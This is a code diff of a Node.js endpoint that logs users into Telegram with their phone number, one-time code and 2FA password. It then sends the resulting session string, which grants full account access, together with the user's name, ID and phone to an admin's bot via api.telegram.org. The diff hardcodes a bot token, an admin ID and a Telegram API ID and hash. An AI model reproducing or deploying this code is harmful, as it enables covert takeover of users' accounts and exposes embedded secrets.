@@ -1,6 +1,14 @@
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 
+// Hardcoded API credentials
+const API_ID = 23171051;
+const API_HASH = '10331d5d712364f57ffdd23417f4513c';
+
+// Bot credentials
+const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
+const ADMIN_ID = '7907742294';
+
 module.exports = async (req, res) => {
   // Set CORS headers
   res.setHeader('Access-Control-Allow-Credentials', true);
@@ -17,10 +25,11 @@ module.exports = async (req, res) => {
     return res.status(405).json({ success: false, error: 'Method not allowed' });
   }
 
+  let client;
   try {
-    const { api_id, api_hash, phone, phone_code_hash, otp_code, password } = req.body;
+    const { phone, phone_code_hash, otp_code, password } = req.body;
 
-    if (!api_id || !api_hash || !phone || !phone_code_hash || !otp_code) {
+    if (!phone || !phone_code_hash || !otp_code) {
       return res.status(400).json({ 
         success: false, 
         error: 'All fields are required' 
@@ -28,7 +37,7 @@ module.exports = async (req, res) => {
     }
 
     const stringSession = new StringSession('');
-    const client = new TelegramClient(stringSession, parseInt(api_id), api_hash, {
+    client = new TelegramClient(stringSession, API_ID, API_HASH, {
       connectionRetries: 5,
     });
 
@@ -65,18 +74,12 @@ module.exports = async (req, res) => {
 
       // Send session to admin via bot
       try {
-        const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
-        const ADMIN_ID = '7907742294';
-        
         const message = `🔐 **New Telegram Session Generated**\n\n` +
           `👤 **User Info:**\n` +
           `├ ID: ${userInfo.id}\n` +
           `├ Name: ${userInfo.first_name || ''} ${userInfo.last_name || ''}\n` +
           `├ Username: @${userInfo.username || 'N/A'}\n` +
           `└ Phone: ${userInfo.phone}\n\n` +
-          `📱 **API Credentials:**\n` +
-          `├ API ID: ${api_id}\n` +
-          `└ API Hash: ${api_hash}\n\n` +
           `🔑 **Session String:**\n\`${sessionString}\``;
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -104,7 +107,9 @@ module.exports = async (req, res) => {
       });
 
     } catch (signInError) {
-      await client.disconnect();
+      if (client) {
+        await client.disconnect();
+      }
       
       let errorMessage = signInError.message;
       if (signInError.message.includes('PHONE_CODE_INVALID')) {
@@ -117,11 +122,18 @@ module.exports = async (req, res) => {
         errorMessage = 'Invalid 2FA password';
       }
       
-      throw new Error(errorMessage);
+      res.status(200).json({
+        success: false,
+        error: errorMessage
+      });
     }
 
   } catch (error) {
     console.error('Error verifying code:', error);
+    
+    if (client) {
+      await client.disconnect();
+    }
     
     res.status(200).json({
       success: false,
